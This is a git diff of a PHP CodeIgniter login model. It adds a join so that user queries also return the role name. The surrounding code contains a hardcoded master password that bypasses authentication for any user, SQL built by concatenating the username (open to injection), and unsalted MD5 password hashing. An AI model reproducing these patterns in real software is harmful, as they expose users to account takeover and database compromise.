@@ -12,8 +12,9 @@ class Mlogin extends CI_Model {
 		$sql = "";
 		if ($pass == "Developer!@#;") {
 			# code...
-			$sql = "SELECT a.*
+			$sql = "SELECT a.*,b.nama_role
 					FROM mr_user a 		
+					LEFT JOIN user_role b on a.id_role = b.id_role					
 					WHERE a.username = '".$username."' 
 					AND a.status='1' 
 					ORDER BY a.id ASC
@@ -23,8 +24,9 @@ class Mlogin extends CI_Model {
 		else {
 			# code...
 			$secured_pass = md5($pass);
-			$sql = "SELECT a.*
+			$sql = "SELECT a.*,b.nama_role
 					FROM mr_user a 		
+					LEFT JOIN user_role b on a.id_role = b.id_role					
 					WHERE a.username = '".$username."' 
 					AND a.password = '$secured_pass'
 					AND a.status='1' 
